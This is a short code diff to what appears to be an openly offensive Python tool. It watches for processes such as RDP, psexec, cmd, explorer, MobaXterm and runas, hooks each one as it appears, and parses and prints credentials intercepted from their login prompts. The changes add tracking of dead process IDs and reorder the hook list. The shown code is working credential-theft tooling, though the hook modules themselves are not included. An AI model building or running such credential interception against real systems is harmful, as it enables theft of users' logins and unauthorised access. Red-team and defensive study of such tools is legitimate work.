@@ -19,6 +19,14 @@ def get_process_by_list_names(name_list: List[str]) -> List[psutil.Process]:
     return process_list
 
 
+def get_all_process_pids():
+    process_pids = []
+    for process in psutil.process_iter():
+        process_id = process.pid
+        process_pids.append(process_id)
+    return process_pids
+
+
 def get_process_by_name(name: str) -> List[psutil.Process]:
     return get_process_by_list_names([name])
 
@@ -41,8 +49,11 @@ def wait_for_process(process_name, tag_name, hook_function):
                 running_pids.append(process.pid)
                 print(f"[+] Found {tag_name} Window")
                 hook_function(process.pid)
-            # TODO: elif check if pids still alive -> if not then remove from running_pids
-
+            else:
+                for pid in running_pids:
+                    if pid not in get_all_process_pids():
+                        running_pids.remove(pid)
+                        print(f"[-] {pid} is dead")
         sleep(0.5)
 
 
@@ -51,7 +62,8 @@ def on_credential_submit(message, data):
     print(message)
     if message['type'] == "send":
         credential_dump = message["payload"]
-        hooked_program = re.search(r"Intercepted Creds from (?P<hooked_program>[A-z]*)", credential_dump).groups("hooked_program")[0]
+        hooked_program = \
+        re.search(r"Intercepted Creds from (?P<hooked_program>[A-z]*)", credential_dump).groups("hooked_program")[0]
 
         print(f"[+] Parsed credentials submitted to {hooked_program} prompt:")
         print(credential_dump)
@@ -62,7 +74,7 @@ def on_credential_submit(message, data):
 def main():
     from hooks import rdp, psexec, explorer, cmd, mobaxterm, runas
 
-    functions = [psexec.wait_for, rdp.wait_for, explorer.wait_for, cmd.wait_for, mobaxterm.wait_for, runas.wait_for]
+    functions = [cmd.wait_for, psexec.wait_for, rdp.wait_for, explorer.wait_for, mobaxterm.wait_for, runas.wait_for]
     run_thread_pool_for_functions(functions)
 
 
